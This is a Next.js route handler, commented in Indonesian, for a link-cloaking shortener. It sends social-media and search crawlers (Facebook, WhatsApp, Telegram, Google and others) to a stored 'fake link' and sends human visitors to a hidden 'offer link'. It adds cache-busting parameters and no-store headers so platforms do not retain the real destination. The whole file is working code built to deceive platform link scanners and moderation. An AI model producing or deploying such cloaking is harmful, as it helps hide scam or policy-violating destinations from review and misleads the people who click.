import { turso } from "@/lib/turso";
import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';
export const fetchCache = 'force-no-store';

export async function GET(request, { params }) {
  try {
    const resolvedParams = await params;
    const shortcode = resolvedParams.shortcode;

    // 1. Baca identitas (User-Agent)
    const userAgent = request.headers.get('user-agent') || '';

    // 2. Deteksi Bot Sosial Media (Murni untuk Scraper)
    const isBot = /facebookexternalhit|whatsapp|telegrambot|twitterbot|googlebot|bingbot|slurp|spider/i.test(userAgent);

    // 3. Cari data link di database
    const result = await turso.execute({
      sql: "SELECT * FROM links WHERE short_code = ?",
      args: [shortcode]
    });

    if (result.rows.length === 0) {
      return NextResponse.redirect(new URL('/', request.url));
    }

    const data = result.rows[0];

    // ==========================================
    // SENJATA ANTI-CACHE: Angka Acak (Cache Buster)
    // ==========================================
    const randomNum = Math.floor(Math.random() * 10000000);

    // Header untuk memaksa browser tidak menyimpan riwayat
    const noCacheHeaders = {
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
      'Pragma': 'no-cache',
    };

    if (isBot) {
      // JIKA BOT FB -> Lempar ke Fake Link
      let fakeUrl = data.fake_link || 'google.com'; 
      if (!fakeUrl.startsWith('http')) fakeUrl = 'https://' + fakeUrl;
      
      // Sisipkan angka acak di ujung URL
      const separator = fakeUrl.includes('?') ? '&' : '?';
      fakeUrl = `${fakeUrl}${separator}cb=${randomNum}`;

      // Gunakan status 307 agar FB dilarang keras menyimpan URL ini
      return NextResponse.redirect(new URL(fakeUrl), { 
        status: 307, 
        headers: noCacheHeaders 
      });
      
    } else {
      // JIKA MANUSIA ASLI -> Lempar ke Offer Link
      await turso.execute({
        sql: "UPDATE links SET click_count = click_count + 1 WHERE short_code = ?",
        args: [shortcode]
      });

      let offerUrl = data.offer_link || 'google.com';
      if (!offerUrl.startsWith('http')) offerUrl = 'https://' + offerUrl;
      
      // Sisipkan angka acak di ujung URL
      const separator = offerUrl.includes('?') ? '&' : '?';
      offerUrl = `${offerUrl}${separator}cb=${randomNum}`;

      // Gunakan status 307
      return NextResponse.redirect(new URL(offerUrl), { 
        status: 307, 
        headers: noCacheHeaders 
      });
    }

  } catch (error) {
    console.error("System Error Route:", error);
    return new NextResponse("Server Crash: " + error.message, { status: 500 });
  }
}
